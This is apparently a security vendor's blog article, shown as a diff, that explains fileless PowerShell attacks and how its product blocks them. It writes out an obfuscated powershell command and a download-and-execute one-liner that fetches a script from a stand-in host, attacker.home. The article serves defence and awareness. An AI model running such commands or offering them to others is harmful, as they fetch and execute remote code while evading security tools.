@@ -1,0 +1,37 @@
+Windows PowerShell is a powerful tool used by many administrators and users to automate and control many aspects of the Windows operating system. However, with such power comes great responsibility and the inevitable abuse by bad actors to infiltrate your device and infect it with malware is now a harsh reality. Fileless PowerShell attacks are now involved in nearly all new attack vectors.
+
+Attack vectors are getting more sophisticated every day. The significant increase in fileless based attacks is on the rise, with 77% of successful attacks now using fileless exploits (PeerLyst) to evade traditional signature based AntiVirus (AV) software. Fileless PowerShell attacks are now the preferred weapon of choice for many of these attacks because it provides a number of techniques for bypassing existing security. Not least of all, the ability to run directly in memory and remotely download payloads.
+
+BlackFog Network Protection options
+Most security products find PowerShell attack vectors hard to stop because they cannot rely on signatures. Since the PowerShell is a core part of the operating system, can be easily obfuscated and bypasses application whitelisting, attack scripts can evade detection from most security software. We discuss some of the mechanisms employed by malware leveraging PowerShell scripts below.
+
+Privilege Escalation
+Privilege escalation is a common way malware is able to execute using the PowerShell command line. While the PowerShell is restricted from running scripts by default, most users / administrators re-enable this so they can use scripts in their daily activities or execute them at login. There are also several ways to bypass this restriction by using the “-command” argument.
+
+Another common technique is to bypass the execution policy directly by passing the “-executionpolicy bypass” command to PowerShell and execute the scripts directly.
+
+Obfuscation
+Obfuscation of PowerShell scripts takes many forms. Attacks essentially hide commands from security software through clever techniques such as encoding and escaping. For example a common technique is to escape the commands using backticks or carets such as the following:
+
+powershell.exe -c^o^m^m^a^n^d -F^i^l^e “script.ps1”
+
+Other techniques include the use of encoding to hide commands use base64 encoding, by using the “-encodedcommand” keyword on the command line.
+
+Compiled scripts
+To avoid the problem, some organizations use blacklisting to block script execution entirely through Powershell.exe. However, there are many ways around this from an attackers perspective which do not require the PowerShell to be executed at all. Malware may execute alternative shells to execute their malicious scripts using custom built executables. Any security software needs to be able to detect such execution regardless of how it manifests on the endpoint.
+
+Exploit Kits
+Exploit toolkits are now very prevalent such as PowerSploit and Mimikatz, to name but a few. These kits have been specifically designed to bypass and steal device and user credentials to execute more serious and lateral attacks within a network.
+
+Remote Download and Execution
+Remote code execution is another powerful technique employed by malware to remain undetected. Commands such as the following can be used to execute a remote script without ever touching the users machine. As such it is crucial that these techniques are prevented at the source.
+
+powershell.exe -command “iex(New-Object Net.WebClient).DownloadString(‘http://attacker.home/myscript.ps1’)”
+
+Propagation
+We have discussed many of the techniques used by fileless PowerShell scripts and commands, but how do they propagate within an organization? PowerShell scripts are normally used at the start of a new attack because they can go undetected. As such, they are most often used to launch a larger payload for an attack. They are most often encapsulated in email attachments with various extensions such as .wsf, .html, .pdf, .js or any office extension such as .pptx, xlsx etc.
+
+Another common method of propagation is within Office macros. This is a very specialized technique because the macro itself does not actually contain the code itself, but can present in metadata such as table cells. This executes the command directly, so any macro scanning would not detect problems.
+
+Prevention
+It is crucial that any security software is able to mitigate attacks through the PowerShell by stopping these and other important PowerShell attack points. At the same time it is important that legitimate PowerShell scripts are allowed to execute. BlackFog believes in a layered approach to security, stopping attacks at each point of the infection cycle. As such, the PowerShell is an important part of this approach and is enabled by default on all installations of BlackFog Privacy.
